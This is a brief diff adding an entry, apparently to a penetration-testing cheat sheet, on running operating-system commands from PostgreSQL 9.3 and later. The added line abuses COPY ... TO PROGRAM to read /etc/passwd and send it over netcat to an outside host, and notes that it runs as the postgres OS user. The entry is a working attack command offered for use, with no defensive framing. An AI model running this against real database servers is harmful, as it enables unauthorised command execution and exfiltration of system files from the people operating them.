@@ -1,0 +1,5 @@
+pentest monkey has 2 methods to execute commands with postgres SQL.  Here's a new way I discovered in early 2018 that was introduced in 9.3+
+
+Command Execution:	
+COPY pg_catalog.pg_language TO PROGRAM 'cat /etc/passwd | nc 10.0.0.1 8080';  — priv, commands run as postgres/pgsql OS-level user  (postgres SQL 9.3+)
+
